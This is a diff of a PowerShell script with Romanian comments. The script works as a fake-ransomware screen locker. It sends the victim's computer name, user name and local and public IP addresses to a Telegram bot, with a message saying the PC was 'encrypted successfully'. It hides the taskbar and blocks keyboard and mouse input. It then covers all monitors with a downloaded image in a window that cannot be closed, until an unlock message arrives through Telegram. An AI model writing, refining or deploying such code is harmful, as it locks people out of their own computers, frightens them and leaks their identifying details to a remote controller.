@@ -1,21 +1,18 @@
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-# Cod nativ pt blocare și taskbar
+# Cod pentru input și taskbar
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
 public class Native {
-    [DllImport("user32.dll")]
-    public static extern bool BlockInput(bool fBlockIt);
-    [DllImport("user32.dll")]
-    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
-    [DllImport("user32.dll")]
-    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
+    [DllImport("user32.dll")] public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 }
 "@
 
-# ▶️ Variabile sistem
+# ▶️ Config și sistem
 $pc = $env:COMPUTERNAME
 $user = $env:USERNAME
 $chatID = '656189986'
@@ -26,41 +23,44 @@ $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
     Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
 
 # IP public
-try { $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") -as [string] } catch { $ipPublic = "n/a" }
+try { $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") } catch { $ipPublic = "n/a" }
 
-# ▶️ Trimite mesaj inițial în Telegram
+# ▶️ Trimite mesaj la pornire
 $message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic"
 $uriSend = "https://api.telegram.org/bot$botToken/sendMessage"
-$body = @{
-    chat_id = $chatID
-    text    = $message
-} | ConvertTo-Json -Compress
-try {
-    $response = Invoke-RestMethod -Uri $uriSend -Method POST -Body $body -ContentType 'application/json'
-} catch {}
+$body = @{ chat_id = $chatID; text = $message } | ConvertTo-Json -Compress
+try { Invoke-RestMethod -Uri $uriSend -Method POST -Body $body -ContentType 'application/json' } catch {}
 
-# ▶️ Ascunde Taskbar și blochează input
+# ▶️ Ascunde taskbar și blochează input
 $taskbar = [Native]::FindWindow("Shell_TrayWnd", "")
 [Native]::ShowWindow($taskbar, 0)
 [Native]::BlockInput($true)
 
 # ▶️ Descarcă imaginea
 $temp = "$env:TEMP\poza_laptop.jpg"
-Invoke-WebRequest "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $temp -UseBasicParsing
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $temp -UseBasicParsing
 
-# ▶️ Calculează dimensiunea totală a ecranelor
+# ▶️ Calculează full screen pe toate monitoarele
 $bounds = [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { $_.Bounds }
 $minX = ($bounds | ForEach-Object { $_.X }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
 $minY = ($bounds | ForEach-Object { $_.Y }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
-$maxRight = ($bounds | ForEach-Object { $_.Right }) | Measure-Object -Maximum | Select-Object -ExpandProperty Maximum
-$maxBottom = ($bounds | ForEach-Object { $_.Bottom }) | Measure-Object -Maximum | Select-Object -ExpandProperty Maximum
-$width = $maxRight - $minX
-$height = $maxBottom - $minY
+$maxX = ($bounds | ForEach-Object { $_.Right }) | Measure-Object -Maximum | Select-Object -ExpandProperty Maximum
+$maxY = ($bounds | ForEach-Object { $_.Bottom }) | Measure-Object -Maximum | Select-Object -ExpandProperty Maximum
+$width = $maxX - $minX
+$height = $maxY - $minY
 
-# ▶️ Variabilă de control
+# ▶️ Variabilă globală
 $script:inchis = $false
 
-# ▶️ Creează fereastra mare
+# ▶️ Funcție închidere completă
+function InchideTot {
+    $script:inchis = $true
+    [Native]::BlockInput($false)
+    [Native]::ShowWindow($taskbar, 1)
+    $form.Invoke([Action]{ $form.Close() })
+}
+
+# ▶️ Form mare
 $form = New-Object Windows.Forms.Form
 $form.StartPosition = 'Manual'
 $form.Location = New-Object Drawing.Point $minX, $minY
@@ -79,42 +79,34 @@ $pb.Dock = 'Fill'
 $pb.SizeMode = 'Zoom'
 $form.Controls.Add($pb)
 
-# ▶️ Închide la tasta C
+# ▶️ Închidere la tasta C
 $form.Add_KeyDown({
     if ($_.KeyCode -eq 'C') {
-        $script:inchis = $true
-        $form.Close()
+        InchideTot
     }
 })
 
 $form.Add_FormClosing({
-    if (-not $script:inchis) {
-        $_.Cancel = $true
-    }
+    if (-not $script:inchis) { $_.Cancel = $true }
 })
 
-# ▶️ Buclă paralelă de monitorizare Telegram în timer (nu job/thread!)
+# ▶️ Verifică Telegram la fiecare 5 sec
 $timer = New-Object Windows.Forms.Timer
 $timer.Interval = 5000
 $timer.Add_Tick({
     try {
         $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getUpdates"
-        foreach ($update in $updates.result) {
-            $text = $update.message.text
+        foreach ($u in $updates.result) {
+            $text = $u.message.text
             if ($text -eq "👍 $user" -or $text -eq "👍 $pc") {
                 $timer.Stop()
-                $script:inchis = $true
-                $form.Close()
+                InchideTot
             }
         }
     } catch {}
 })
 $timer.Start()
 
-# ▶️ Rulează aplicația
+# ▶️ Arată fereastra și rulează
 $form.Show()
 [System.Windows.Forms.Application]::Run($form)
-
-# ▶️ Deblochează după închidere
-[Native]::BlockInput($false)
-[Native]::ShowWindow($taskbar, 1)
